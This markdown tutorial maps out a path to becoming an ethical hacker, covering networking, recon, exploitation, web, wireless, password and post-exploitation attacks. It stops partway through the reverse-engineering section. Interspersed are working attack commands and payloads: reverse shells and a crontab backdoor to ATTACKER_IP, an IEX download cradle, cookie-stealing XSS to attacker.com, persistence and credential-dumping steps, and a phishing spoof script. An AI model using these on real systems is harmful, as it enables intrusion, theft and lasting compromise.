# 🧠 Become a Hacker — The Complete Roadmap

> *"Hacking is not about breaking things. It's about understanding systems deeply enough to make them do what you want."*

This guide covers the **A to Z journey** of becoming a skilled ethical hacker / penetration tester — from zero knowledge to advanced red teaming. Follow the sections in order, or jump to what you need.

---

## 1. What is Hacking?

**Hacking** is the practice of finding and exploiting weaknesses in computer systems, networks, or software — not necessarily with malicious intent. At its core, hacking is problem-solving through deep technical understanding.

### The Three Pillars of Hacking
| Pillar | Description |
|--------|-------------|
| **Knowledge** | Deep understanding of how systems work |
| **Creativity** | Finding unconventional paths others miss |
| **Persistence** | Methodical approach to finding a way in |

### Hacking vs. Cracking
- **Hacking** — Exploring systems to understand and improve them
- **Cracking** — Malicious exploitation for personal gain

---

## 2. Types of Hackers

### By Intent (The Hat System)
| Hat | Name | Intent | Legality |
|-----|------|--------|----------|
| ⬜ **White Hat** | Ethical Hacker / Pentester | Improve security | Legal (authorized) |
| ⬛ **Black Hat** | Cracker / Malicious Hacker | Steal, damage, disrupt | Illegal |
| 🩶 **Grey Hat** | In-between | May break in without permission but not maliciously | Legally grey |
| 🔵 **Blue Hat** | Revenge Hacker | Personal revenge | Illegal |
| 🟢 **Green Hat** | Newbie / Script Kiddie | Learning, sometimes reckless | Varies |
| 🔴 **Red Hat** | Vigilante | Takes down black hats aggressively | Legally grey |

### By Role in Organizations
- **Penetration Tester** — Authorized simulated attacker
- **Red Team** — Offensive security team simulating real adversaries
- **Blue Team** — Defensive security team
- **Purple Team** — Combined red + blue collaboration
- **Bug Bounty Hunter** — Independent researcher reporting vulnerabilities

---

## 3. Legal & Ethical Foundation

> ⚠️ **CRITICAL: Never hack systems without explicit written permission. Unauthorized access is a criminal offense in virtually every country.**

### Key Laws You Must Know
| Country | Law |
|---------|-----|
| USA | Computer Fraud and Abuse Act (CFAA) |
| UK | Computer Misuse Act 1990 |
| EU | Directive on Attacks Against Information Systems |
| India | Information Technology Act 2000 (Section 66) |
| Australia | Criminal Code Act 1995 |

### The Golden Rules of Ethical Hacking
1. **Get written authorization** — Always. No exceptions.
2. **Define scope clearly** — Know exactly what you're allowed to test.
3. **Don't cause damage** — Your goal is to find vulnerabilities, not exploit them destructively.
4. **Report all findings** — Even those that seem minor.
5. **Maintain confidentiality** — What you find stays between you and the client.
6. **Stay within scope** — If you find something out-of-scope, stop and report.

### Building an Ethics Framework
- Use dedicated lab environments for practice (never production)
- Use platforms like HackTheBox, TryHackMe, and DVWA for safe practice
- Follow responsible disclosure when reporting bugs
- Never use tools learned for personal revenge, financial gain, or surveillance

---

## 4. Core Mindset

Becoming a hacker is more about **how you think** than what tools you know.

### Think Like an Attacker
- **Question everything** — "What happens if I send unexpected input here?"
- **Follow the data** — Trace how data moves through a system
- **Find the weakest link** — Security is only as strong as its weakest point
- **Think in layers** — Defense in depth means you need to bypass multiple controls

### Key Traits of Great Hackers
- **Curiosity** — Compulsive desire to understand how things work
- **Patience** — Real exploits can take days or weeks to find
- **Creativity** — Chaining small findings into big impacts
- **Continuous learning** — The field changes constantly
- **Documentation habits** — Write everything down

---

## 5. Prerequisites — What You Must Know First

Before diving into hacking, build these foundational skills:

### 5.1 Computer Science Basics
- How CPUs, memory, and storage work
- Binary, hexadecimal, and decimal number systems
- File systems (NTFS, ext4, FAT32)
- How processes and threads work
- Compilation vs. interpretation of code

### 5.2 Networking Fundamentals (Must-Know)
- OSI and TCP/IP models
- IP addressing (IPv4, IPv6, subnetting)
- DNS, DHCP, HTTP/S, FTP, SSH, SMTP
- Routing, switching, NAT, firewalls
- Packet structure and how packets travel

### 5.3 Operating System Basics
- Windows file system, registry, processes
- Linux/Unix commands and structure
- Process management, permissions, users
- Logs and audit trails

### 5.4 Basic Programming
- At minimum: Python + Bash scripting
- Understanding of how code executes
- Reading code in C, JavaScript, PHP

---

## 6. Networking Deep Dive

Networking is the backbone of hacking. You cannot bypass what you don't understand.

### 6.1 OSI Model (Attacker's Perspective)
| Layer | Name | Attack Examples |
|-------|------|-----------------|
| 7 | Application | SQLi, XSS, XXE, RFI |
| 6 | Presentation | SSL stripping, encoding attacks |
| 5 | Session | Session hijacking, cookie theft |
| 4 | Transport | SYN flood, port scanning |
| 3 | Network | IP spoofing, routing attacks |
| 2 | Data Link | ARP poisoning, MAC spoofing |
| 1 | Physical | Cable tapping, rogue access points |

### 6.2 Critical Protocols to Master
```
TCP/IP   — Three-way handshake (SYN, SYN-ACK, ACK)
UDP      — Connectionless, used in DNS/SNMP attacks
HTTP/S   — Web traffic, headers, cookies, sessions
DNS      — Resolution process, zone transfers, DNS poisoning
ARP      — IP-to-MAC resolution, ARP cache poisoning
ICMP     — Ping, traceroute, covert channels
SMB      — Windows file sharing, EternalBlue target
SSH      — Secure shell, key-based auth, tunneling
SNMP     — Network device management, info disclosure
```

### 6.3 Subnetting Cheat Sheet
```
/8   = 255.0.0.0       = 16,777,214 hosts
/16  = 255.255.0.0     = 65,534 hosts
/24  = 255.255.255.0   = 254 hosts
/25  = 255.255.255.128 = 126 hosts
/26  = 255.255.255.192 = 62 hosts
/27  = 255.255.255.224 = 30 hosts
/28  = 255.255.255.240 = 14 hosts
/30  = 255.255.255.252 = 2 hosts
```

### 6.4 Packet Analysis with Wireshark
```bash
# Capture on interface
wireshark -i eth0

# Common filters
ip.addr == 192.168.1.1       # Filter by IP
tcp.port == 80               # Filter by port
http                         # Only HTTP traffic
tcp.flags.syn == 1           # SYN packets only
!(arp or dns or icmp)        # Exclude noise
```

---

## 7. Operating Systems

### 7.1 Linux (Primary OS for Hackers)
Most hacking tools run natively on Linux. Use **Kali Linux** or **Parrot OS** as your primary attack platform.

Key distributions:
- **Kali Linux** — Industry standard, pre-loaded with tools
- **Parrot OS** — Lighter alternative to Kali
- **BlackArch** — Arch-based, massive tool repository
- **REMnux** — Malware analysis focused

### 7.2 Windows (Primary Target OS)
Understand Windows deeply because most enterprise targets run it:
- Registry structure (`HKLM`, `HKCU`, etc.)
- Active Directory, Group Policy
- Windows Event Logs (Security, System, Application)
- PowerShell and CMD for post-exploitation
- UAC, NTLM, Kerberos authentication

### 7.3 macOS
- UNIX-based, similar to Linux for many attack techniques
- Keychain vulnerabilities, XPC services, SIP bypass

---

## 8. Programming & Scripting for Hackers

You don't need to be a developer, but you **must** be able to read, write, and modify code.

### 8.1 Python (Most Important)
```python
# Port scanner example
import socket

def scan_port(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except:
        return False

target = "192.168.1.1"
for port in range(1, 1025):
    if scan_port(target, port):
        print(f"[+] Port {port} is OPEN")
```

Key Python libraries for hackers:
- `socket` — Network connections
- `requests` — HTTP requests
- `scapy` — Packet crafting
- `paramiko` — SSH connections
- `pwntools` — CTF and exploit dev
- `impacket` — Windows/AD protocol attacks

### 8.2 Bash Scripting
```bash
#!/bin/bash
# Simple ping sweep
for i in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$i > /dev/null 2>&1 && \
    echo "[+] 192.168.1.$i is UP"
done
```

### 8.3 PowerShell (for Windows targets)
```powershell
# List all open ports on Windows target
netstat -ano | findstr LISTENING

# Get running processes
Get-Process | Sort-Object CPU -Descending

# Download and execute (for payloads)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

### 8.4 JavaScript (for Web Hacking)
Understanding JS is critical for:
- XSS payload crafting
- DOM manipulation attacks
- Browser-based exploits
- Node.js server-side vulnerabilities

### 8.5 SQL (for Injection Attacks)
```sql
-- Basic injection test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

-- Extract database name
' UNION SELECT database()--

-- Extract tables
' UNION SELECT table_name FROM information_schema.tables--
```

---

## 9. Linux Mastery

Every hacker lives in the terminal. These commands are non-negotiable.

### 9.1 Essential Commands
```bash
# File System
ls -la          # List all files with permissions
find / -name "*.conf" 2>/dev/null    # Find config files
grep -r "password" /etc/ 2>/dev/null # Search for passwords
cat /etc/passwd  # User accounts
cat /etc/shadow  # Password hashes (needs root)

# Process & System
ps aux           # All running processes
netstat -tulpn   # Open ports and services
ss -tulpn        # Modern alternative to netstat
id               # Current user and groups
whoami           # Current user
uname -a         # System info

# Network
ifconfig / ip a  # Network interfaces
route -n         # Routing table
arp -a           # ARP cache
curl / wget      # HTTP requests
nc (netcat)      # Swiss army knife for network

# Permissions
chmod 777 file   # rwx for all
chown user:group file
sudo -l          # What can current user run as root?

# File Transfer
scp file user@host:/path
rsync -avz src/ user@host:/dest
python3 -m http.server 8080  # Quick HTTP server
```

### 9.2 Important Files & Directories
```
/etc/passwd       — User accounts
/etc/shadow       — Password hashes
/etc/hosts        — Local DNS entries
/etc/crontab      — Scheduled tasks
/var/log/         — System logs
/tmp/             — Temp files (writable by all)
/home/            — User home directories
/root/            — Root's home directory
~/.bash_history   — Command history
~/.ssh/           — SSH keys
/proc/            — Process and kernel info
```

### 9.3 Useful One-Liners
```bash
# Reverse shell with bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Find SUID binaries (priv esc)
find / -perm -u=s -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Live log monitoring
tail -f /var/log/auth.log
```

---

## 10. Reconnaissance & OSINT

Reconnaissance is the **most important** phase. The more you know about a target, the higher your success rate.

### 10.1 Passive Reconnaissance (No Direct Contact)
You gather information without touching the target's systems.

```bash
# DNS Lookup
nslookup target.com
dig target.com ANY
host -a target.com

# WHOIS
whois target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com
theHarvester -d target.com -b google

# Google Dorks (Google Hacking)
site:target.com              # All indexed pages
site:target.com filetype:pdf # PDF files
site:target.com inurl:admin  # Admin panels
intitle:"index of" target.com # Directory listings
"target.com" ext:sql         # SQL files
```

### 10.2 Google Dork Cheat Sheet
| Dork | Purpose |
|------|---------|
| `site:` | Restrict to domain |
| `filetype:` | Specific file types |
| `inurl:` | Keywords in URL |
| `intitle:` | Keywords in page title |
| `intext:` | Keywords in page body |
| `cache:` | Cached version of a page |
| `link:` | Pages linking to a URL |

### 10.3 Active Reconnaissance (Direct Contact)
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sV -sC -p- target.com

# Banner grabbing
nc -v target.com 80
telnet target.com 25

# DNS zone transfer
dig axfr @ns1.target.com target.com
```

### 10.4 OSINT Tools
| Tool | Purpose |
|------|---------|
| **Maltego** | Visual link analysis and OSINT |
| **Shodan** | Internet-connected device search engine |
| **Censys** | Similar to Shodan, more detail |
| **theHarvester** | Emails, subdomains, IPs from public sources |
| **Recon-ng** | Web reconnaissance framework |
| **SpiderFoot** | Automated OSINT collection |
| **OSINT Framework** | Directory of OSINT tools by category |
| **Hunter.io** | Find email addresses |
| **LinkedIn** | Employee and org info |
| **Have I Been Pwned** | Check for data breaches |

---

## 11. Scanning & Enumeration

After recon, you actively probe for open services and vulnerabilities.

### 11.1 Nmap — The King of Scanners
```bash
# Quick scan
nmap -F target.com

# Full port scan (slow but thorough)
nmap -p- target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Run default scripts
nmap -sC target.com

# The "all-in-one" scan
nmap -A -p- -T4 target.com

# Stealth SYN scan (requires root)
nmap -sS target.com

# UDP scan
nmap -sU target.com

# Output to file
nmap -oN output.txt target.com
nmap -oX output.xml target.com
nmap -oA all_formats target.com

# Vulnerability scanning with NSE scripts
nmap --script vuln target.com
nmap --script=smb-vuln* -p 445 target.com
```

### 11.2 Service Enumeration
```bash
# HTTP/HTTPS Enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
nikto -h http://target.com
whatweb http://target.com

# SMB Enumeration (Windows shares)
enum4linux -a target.com
smbclient -L //target.com
nmap --script smb-enum-shares -p 445 target.com

# SMTP Enumeration
smtp-user-enum -M VRFY -U users.txt -t target.com

# SNMP Enumeration
snmpwalk -c public -v1 target.com
onesixtyone -c community.txt target.com

# DNS Enumeration
dnsenum target.com
fierce --domain target.com
```

### 11.3 Common Ports & Services
| Port | Service | Hacker Notes |
|------|---------|--------------|
| 21 | FTP | Anonymous login, brute force |
| 22 | SSH | Key theft, brute force |
| 23 | Telnet | Plaintext, MITM |
| 25 | SMTP | Email relay, user enum |
| 53 | DNS | Zone transfers, poisoning |
| 80/443 | HTTP/S | Web attacks (XSS, SQLi, etc.) |
| 110/995 | POP3 | Email sniffing |
| 135 | RPC | Windows info leakage |
| 139/445 | SMB | Pass-the-hash, EternalBlue |
| 389/636 | LDAP | AD enumeration |
| 1433 | MSSQL | SQLi, xp_cmdshell |
| 3306 | MySQL | SQLi, brute force |
| 3389 | RDP | Brute force, BlueKeep |
| 5432 | PostgreSQL | SQLi |
| 5985/5986 | WinRM | Remote PS execution |
| 6379 | Redis | Unauthenticated access |
| 8080 | HTTP Alt | Web app testing |
| 27017 | MongoDB | Unauthenticated access |

---

## 12. Vulnerability Assessment

Once you've enumerated services, identify vulnerabilities.

### 12.1 Automated Scanners
```bash
# OpenVAS / Greenbone (Full-featured VA scanner)
openvas-start
# Then access via browser at https://127.0.0.1:9392

# Nessus (Industry standard)
# Install from tenable.com, then:
service nessusd start
# Access at https://localhost:8834

# Nikto (Web app scanner)
nikto -h http://target.com -o report.html -Format html
```

### 12.2 Manual Vulnerability Research
- **CVE databases**: nvd.nist.gov, cve.mitre.org
- **Exploit databases**: exploit-db.com, packetstormsecurity.com
- **Vendor advisories**: Track patch notes for known vulns
- **Searchsploit** (local exploit-db search):
```bash
searchsploit apache 2.4
searchsploit windows smb
searchsploit -m 39446    # Copy exploit to current dir
```

---

## 13. Exploitation Techniques

### 13.1 Metasploit Framework
The most powerful exploitation framework available.

```bash
# Start Metasploit
msfconsole

# Basic workflow
msf> search eternalblue            # Search for exploit
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> show options                  # See required options
msf> set RHOSTS 192.168.1.10
msf> set LHOST 192.168.1.5        # Your IP
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> run                           # Execute exploit

# Useful Meterpreter commands (post-exploitation)
meterpreter> sysinfo              # System information
meterpreter> getuid               # Current user
meterpreter> getsystem            # Try to get SYSTEM
meterpreter> hashdump             # Dump password hashes
meterpreter> shell                # Drop to OS shell
meterpreter> upload file.exe C:\\  # Upload file
meterpreter> download file.txt    # Download file
meterpreter> keyscan_start        # Start keylogger
meterpreter> screenshot           # Take screenshot
meterpreter> migrate PID          # Migrate to another process
meterpreter> run post/multi/recon/local_exploit_suggester
```

### 13.2 Manual Exploitation
For CTFs and real engagements, manual exploitation is often required:

```python
# Buffer overflow skeleton (Python)
import socket

ip = "192.168.1.10"
port = 9999
offset = 2003        # Found via fuzzing
retn = "\xAF\x11\x50\x62"  # JMP ESP address (little-endian)
padding = "\x90" * 16       # NOP sled
payload = ""                 # Shellcode goes here

buffer = "A" * offset + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send((buffer + "\r\n").encode())
s.close()
```

### 13.3 Common Exploit Categories
| Type | Description | Example Tools |
|------|-------------|---------------|
| **Buffer Overflow** | Overflow memory to control execution | pwntools, pwndbg |
| **Format String** | Abuse printf-like functions | Manual, pwntools |
| **Race Condition** | Win a timing race between events | Manual |
| **Use-After-Free** | Access freed memory | Manual, IDA Pro |
| **Integer Overflow** | Numeric wrap-around to bypass checks | Manual |
| **Heap Spray** | Fill heap to land shellcode | JavaScript |

---

## 14. Web Application Hacking

Web apps are the most common attack surface. Master OWASP Top 10.

### 14.1 OWASP Top 10 (2021)
| # | Vulnerability | Short Description |
|---|--------------|-------------------|
| A01 | Broken Access Control | Users accessing unauthorized resources |
| A02 | Cryptographic Failures | Weak/absent encryption |
| A03 | Injection | SQLi, XSS, command injection |
| A04 | Insecure Design | Flawed architecture and logic |
| A05 | Security Misconfiguration | Default creds, unnecessary features |
| A06 | Vulnerable Components | Outdated libraries, frameworks |
| A07 | Auth & Session Failures | Weak passwords, poor session management |
| A08 | Software & Data Integrity | Unsigned updates, insecure CI/CD |
| A09 | Logging Failures | No audit trail for attacks |
| A10 | SSRF | Server making requests to internal resources |

### 14.2 SQL Injection
```sql
-- Detection
' 
''
`
')
"))

-- Authentication bypass
admin'--
admin' #
' OR 1=1--
' OR 'x'='x

-- UNION-based extraction
' ORDER BY 1--   (increment until error)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

-- Blind SQLi (boolean-based)
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING(username,1,1)='a'--

-- Time-based blind SQLi
' AND SLEEP(5)--  (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)

-- SQLMap automation
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

### 14.3 Cross-Site Scripting (XSS)
```html
<!-- Reflected XSS tests -->
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

<!-- Cookie stealing payload -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Stored XSS (in comment fields) -->
<img src="x" onerror="fetch('http://attacker.com/?c='+document.cookie)">

<!-- DOM XSS -->
#<img src=x onerror=alert(1)>
```

### 14.4 Command Injection
```bash
# In input fields, try:
; ls
| ls
&& ls
|| ls
`ls`
$(ls)

# URL encoded versions
%3B%20ls   (= ; ls)

# Extract /etc/passwd
; cat /etc/passwd
| cat /etc/passwd

# Reverse shell via command injection
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

### 14.5 File Inclusion Vulnerabilities
```bash
# Local File Inclusion (LFI)
?page=../../../../etc/passwd
?page=....//....//etc/passwd   (filter bypass)
?page=php://filter/convert.base64-encode/resource=config.php

# Remote File Inclusion (RFI)
?page=http://attacker.com/shell.txt

# Log poisoning via LFI
# 1. Inject PHP in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
# 2. Include log file
?page=/var/log/apache2/access.log&cmd=id
```

### 14.6 Insecure Direct Object Reference (IDOR)
```
# Change user ID in URL/parameter
/api/user/profile?id=1234   →   /api/user/profile?id=1235

# Base64 encoded IDs
/api/profile/MTIzNA==   (decode → 1234, try 1235 → MTIzNQ==)

# UUIDs can sometimes be guessed or iterated
/api/document/550e8400-e29b-41d4-a716-446655440000
```

### 14.7 Burp Suite Workflow
```
1. Configure browser proxy → 127.0.0.1:8080
2. Browse target while Burp captures traffic
3. Intercept and modify requests
4. Use Repeater for manual testing
5. Use Intruder for fuzzing/brute force
6. Use Scanner (Pro) for automated scanning
7. Use Decoder for encoding/decoding
```

---

## 15. Network Attacks

### 15.1 Man-in-the-Middle (MITM) Attacks
```bash
# ARP Poisoning with arpspoof
echo 1 > /proc/sys/net/ipv4/ip_forward   # Enable forwarding
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1   # Poison victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5   # Poison gateway

# Ettercap (All-in-one MITM)
ettercap -T -q -M arp:remote /192.168.1.5// /192.168.1.1//

# Bettercap (Modern MITM framework)
bettercap -iface eth0
net.probe on
arp.spoof on
net.sniff on
```

### 15.2 Sniffing
```bash
# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80 -A         # HTTP in ASCII
tcpdump -i eth0 'tcp[13] & 2 != 0' # SYN packets

# Wireshark filters for credentials
http.request.method == "POST"
ftp.request.command == "PASS"
smtp.req.parameter contains "@"
```

### 15.3 Denial of Service (DoS)
> Only use on your own systems or with explicit permission.

```bash
# SYN flood (hping3)
hping3 -S --flood -V -p 80 target.com

# ICMP flood
hping3 --icmp --flood target.com

# Slowloris (HTTP DoS)
slowloris target.com -p 80 -s 500
```

### 15.4 DNS Attacks
```bash
# DNS Spoofing (with Bettercap)
set dns.spoof.domains target.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# DNS Zone Transfer
dig axfr @ns1.target.com target.com
dnsrecon -d target.com -t axfr
```

---

## 16. Password Attacks

### 16.1 Types of Password Attacks
| Attack | Description | Speed |
|--------|-------------|-------|
| **Dictionary** | Try words from a wordlist | Fast |
| **Brute Force** | Try all combinations | Slow |
| **Hybrid** | Dictionary + rules (append numbers, etc.) | Medium |
| **Rainbow Table** | Pre-computed hash lookup | Very Fast |
| **Credential Stuffing** | Use leaked credentials | Fast |
| **Password Spraying** | One password against many accounts | Slow but stealthy |

### 16.2 Wordlists
```bash
# Kali default wordlists location
/usr/share/wordlists/
/usr/share/wordlists/rockyou.txt   # Most famous (14M passwords)
/usr/share/wordlists/dirb/         # Directory wordlists
/usr/share/wordlists/wfuzz/        # Web fuzzing wordlists

# Generate custom wordlists
crunch 8 12 abcdefghijk123 -o wordlist.txt
cewl http://target.com -d 2 -m 5 -w wordlist.txt  # Website-based
```

### 16.3 Hash Cracking
```bash
# Hashcat (GPU-accelerated)
hashcat -m 0 hashes.txt rockyou.txt          # MD5
hashcat -m 100 hashes.txt rockyou.txt        # SHA1
hashcat -m 1000 hashes.txt rockyou.txt       # NTLM
hashcat -m 1800 hashes.txt rockyou.txt       # SHA512crypt
hashcat -m 13100 hashes.txt rockyou.txt      # Kerberoast

# With rules (adds permutations)
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt rockyou.txt
john --show hashes.txt                       # Show cracked

# Identify hash type
hashid 'hash_here'
hash-identifier
```

### 16.4 Online Service Attacks
```bash
# Hydra (Multi-protocol brute force)
hydra -l admin -P rockyou.txt ftp://192.168.1.10
hydra -l admin -P rockyou.txt ssh://192.168.1.10
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Medusa
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh

# CrackMapExec (Windows/SMB)
crackmapexec smb 192.168.1.0/24 -u admin -p Password123
```

---

## 17. Social Engineering

Technical attacks are hard. Humans are often the easiest vector.

### 17.1 Social Engineering Techniques
| Technique | Description |
|-----------|-------------|
| **Phishing** | Fraudulent emails to steal credentials |
| **Spear Phishing** | Targeted phishing with personal details |
| **Whaling** | Phishing targeting executives |
| **Vishing** | Voice/phone social engineering |
| **Smishing** | SMS-based social engineering |
| **Pretexting** | Creating a fictional scenario to gain trust |
| **Baiting** | Leaving malicious USB drives in public |
| **Tailgating** | Physical intrusion by following someone |
| **Quid Pro Quo** | Offering something in exchange for info |

### 17.2 Phishing with SET (Social Engineering Toolkit)
```bash
setoolkit

# Select:
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
# Enter URL to clone (e.g., https://gmail.com)
# Enter your IP for redirect
```

### 17.3 Email Spoofing
```python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText("Reset your password: http://malicious.site")
msg['Subject'] = 'Security Alert: Reset Required'
msg['From'] = 'security@trusted-company.com'
msg['To'] = 'victim@target.com'

# Open relay abuse (if found)
smtp = smtplib.SMTP('open-relay.target.com', 25)
smtp.sendmail(msg['From'], [msg['To']], msg.as_string())
```

---

## 18. Wireless Hacking

### 18.1 Monitor Mode Setup
```bash
# Enable monitor mode
airmon-ng start wlan0
# This creates wlan0mon

# Check for conflicting processes
airmon-ng check kill
```

### 18.2 WPA2 Cracking
```bash
# Step 1: Scan for networks
airodump-ng wlan0mon

# Step 2: Capture 4-way handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 3: Force client reconnect (deauth)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 4: Crack the handshake
aircrack-ng capture-01.cap -w rockyou.txt

# Hashcat (faster with GPU)
hcxdumptool -i wlan0mon -o capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### 18.3 WPS Attacks
```bash
# Reaver (WPS PIN attack)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Bully (alternative to Reaver)
bully -b AA:BB:CC:DD:EE:FF -e ESSID -c 6 wlan0mon
```

### 18.4 Evil Twin Attack
```bash
# Create fake AP (hostapd-wpe)
# 1. Configure hostapd-wpe.conf
# 2. Start fake AP
hostapd-wpe hostapd-wpe.conf

# With airbase-ng
airbase-ng -e "FreeWifi" -c 6 wlan0mon
```

---

## 19. Post-Exploitation

You're in. Now what? Maximize your access and gather evidence.

### 19.1 System Information Gathering
```bash
# Linux
id && whoami
uname -a
hostname
cat /etc/os-release
ps aux
netstat -tulpn
env
cat /etc/crontab
ls -la /home/

# Windows (CMD)
whoami /all
systeminfo
ipconfig /all
netstat -ano
tasklist
net users
net localgroup administrators
reg query HKLM\Software
```

### 19.2 Credential Harvesting
```bash
# Linux - dump hashes
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt

# Look for stored passwords
grep -r "password" /home/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
find / -name "id_rsa" 2>/dev/null
history | grep pass

# Windows - dump hashes
# In Meterpreter:
hashdump
run post/windows/gather/credentials/credential_collector

# Mimikatz (Windows credential dump)
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
```

### 19.3 Establishing Persistence
```bash
# Linux crontab backdoor
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /etc/crontab

# Linux SSH key persistence
mkdir -p /root/.ssh
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys

# Windows persistence (registry)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\malware.exe"

# Windows scheduled task
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc minute /mo 5
```

---

## 20. Privilege Escalation

Going from a low-privileged user to root/SYSTEM is often the most critical step.

### 20.1 Linux Privilege Escalation
```bash
# Automated enumeration
./linpeas.sh            # Most comprehensive
./linux-exploit-suggester.sh

# Manual checks:

# 1. SUID files
find / -perm -u=s -type f 2>/dev/null

# 2. Writable /etc/passwd
ls -la /etc/passwd
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd

# 3. Sudo misconfigurations
sudo -l
# If you see: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# 4. Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# 5. Weak file permissions
find /etc -writable 2>/dev/null

# 6. PATH hijacking
echo $PATH
# Create malicious binary early in PATH

# 7. Kernel exploits
uname -a
# Search: searchsploit linux kernel 4.15
```

### 20.2 Windows Privilege Escalation
```powershell
# Automated enumeration
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# Manual checks:

# 1. Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 2. Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" *

# 3. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 4. Stored credentials
cmdkey /list
# If found: runas /savecred /user:admin cmd.exe

# 5. SeImpersonatePrivilege (Potato attacks)
whoami /priv
# If SeImpersonatePrivilege: use PrintSpoofer or JuicyPotato
PrintSpoofer.exe -i -c cmd

# 6. Bypass UAC
# Many techniques: fodhelper, eventvwr, computerdefaults
```

---

## 21. Persistence & Lateral Movement

### 21.1 Lateral Movement Techniques
```bash
# Pass-the-Hash (Windows)
# Using Mimikatz extracted NTLM hash
pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH

# PSExec with hash
psexec.py domain/user@target -hashes :NTLM_HASH

# Pass-the-Ticket (Kerberos)
# With Mimikatz
mimikatz# kerberos::ptt ticket.kirbi

# WMI Lateral Movement
wmiexec.py domain/user:password@target
```

### 21.2 Pivoting
```bash
# SSH tunneling (local port forward)
ssh -L 8080:internal.server:80 user@jump.host

# SSH dynamic proxy (SOCKS)
ssh -D 1080 user@jump.host
# Then use proxychains
proxychains nmap -sT 10.0.0.1

# Chisel (HTTP-based tunneling)
# On attacker:
./chisel server -p 8080 --reverse

# On target:
./chisel client attacker:8080 R:socks
```

---

## 22. Malware & Reverse Engineering

### 22.1 Malware Types
| Type | Description |
|------|-------------|
| **Virus** | Self-replicating, attaches to files |
| **Worm** | Self-replicating, spreads via network |
| **Trojan** | Disguised as legitimate software |
| **Ransomware** | Encrypts files, demands payment |
| **Rootkit** | Hides itself in the OS |
| **Keylogger** | Records keystrokes |
| **Spyware** | Secretly monitors user activity |
| **Adware** | Unwanted ads, often bundles spyware |
| **Botnet** | Network of infected machines (C2) |
| **RAT** | Remote Access Trojan |

### 22.2 Malware Analysis Approach
```
Static Analysis (No execution)
├── strings analysis     → strings malware.exe
├── File type/hash       → file malware.exe; md5sum malware.exe
├── PE header analysis   → pestudio, PE-bear
├── Disassembly          → Ghidra (free), IDA Pro (paid)
└── YARA rules           → yara rules.yar malware.exe

Dynamic Analysis (Run in sandbox)
├── Behavioral sandbox   → Any.run, Cuckoo Sandbox, Hybrid-Analysis
├── Process monitoring   → Process Monitor (ProcMon)
├── Network monitoring   → Wireshark, Fakenet-NG
├── Registry monitoring  → Regshot (before/after snapshot)
└── Memory analysis      → Volatility
```

### 22.3 Basic Reverse Engineering
```bash
# Static analysis
strings malware.exe | grep -E "(http|ftp|cmd|powershell)"
file malware.exe
hexdump -C malware.exe | head -20

# Ghidra (free NSA tool)
